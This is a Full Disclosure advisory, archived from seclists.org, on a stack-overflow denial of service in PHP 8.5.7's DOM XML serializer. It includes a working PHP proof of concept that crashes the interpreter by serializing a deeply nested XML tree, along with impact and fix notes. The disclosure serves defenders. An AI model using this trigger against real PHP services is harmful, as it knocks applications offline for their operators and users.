---
title: PHP 8.5.7 `dom_xml_serialization_algorithm()` stack-overflow
url: https://seclists.org/fulldisclosure/2026/Jun/13
source: Full Disclosure
date: 2026-06-21
fetch_date: 2026-06-22T07:17:01.963549
---

# PHP 8.5.7 `dom_xml_serialization_algorithm()` stack-overflow

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# PHP 8.5.7 `dom\_xml\_serialization\_algorithm()` stack-overflow

---

*From*: Khashayar Fereidani <info () fereidani com>
*Date*: Fri, 19 Jun 2026 09:54:43 +0330

---

```
# PHP 8.5.7 `dom_xml_serialization_algorithm()` stack-overflow

**Author:** Khashayar Fereidani
**Disclosure Date:** 2026-06-18
**Advisory:** https://fereidani.com/php-857-domxmlserializationalgorithm-stack-overflow
**Contact:** https://fereidani.com/contact

## Description

The `dom_xml_serialization_algorithm()` and
`dom_xml_serialize_element_node()` functions in
`ext/dom/xml_serializer.c` rely on unbounded recursion to serialize
XML nodes. When serializing a deeply nested XML tree, the continuous
recursive calls exhaust the thread's stack space, causing a
segmentation fault (SIGSEGV). This issue can be triggered via
`Dom\XMLDocument::saveXml()` or by accessing the `$innerHTML` /
`$outerHTML` properties of `Dom\XMLDocument` elements. Note that
`Dom\HTMLDocument` uses an iterative approach and is unaffected.

## Proof of concept

```php
<?php
// A stack overflow occurs due to unbounded recursion in
// dom_xml_serialization_algorithm() and dom_xml_serialize_element_node()
// within ext/dom/xml_serializer.c (introduced in PHP 8.4/8.5).
// The file's own TODO at line 41 notes:
// "TODO: implement iterative approach instead of recursive?".
//
// Under the default 8MB thread stack, serializing a deeply nested XML
// tree crashes PHP with a SIGSEGV (139). Running with `ulimit -s unlimited`
// prevents the crash, proving it is stack exhaustion rather than a logic bug.
//
// The vulnerability is reachable via Dom\XMLDocument::saveXml()
// and the $innerHTML / $outerHTML properties of Dom\XMLDocument elements.
// Note that Dom\HTMLDocument is unaffected, as its HTML5 serializer
// (dom_html5_serialize_node) is iterative.

$document = Dom\XMLDocument::createEmpty();
$root = $document->createElement('root');
$document->appendChild($root);

$current = $root;

// This loop creates a deeply nested tree.
// It crashes under the default stack limit but succeeds with `ulimit
-s unlimited`.
for ($i = 0; $i < 25000; $i++) {
    $element = $document->createElement('e');
    $current->appendChild($element);
    $current = $element;
}

// This line is never reached under the default stack limit.
var_dump(strlen(@$document->saveXml()));
```

Running the script results in:

```bash
Segmentation fault         (core dumped) php poc.php
```

## Impact

An attacker could cause a Denial of Service (DoS) by providing a
maliciously crafted, deeply nested XML document. If the application
processes and attempts to serialize this untrusted structure, the PHP
process will abruptly crash due to stack exhaustion.

## Solution

Refactor the serialization algorithm in `ext/dom/xml_serializer.c` to
use an iterative approach rather than unbounded recursion. A `TODO`
comment already exists in the file at line 41 ("TODO: implement
iterative approach instead of recursive?"). Alternatively, enforcing a
hard limit on DOM nesting depth during creation and parsing could
mitigate the exploitability.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

### Current thread:

* **PHP 8.5.7 `dom\_xml\_serialization\_algorithm()` stack-overflow** *Khashayar Fereidani (Jun 20)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")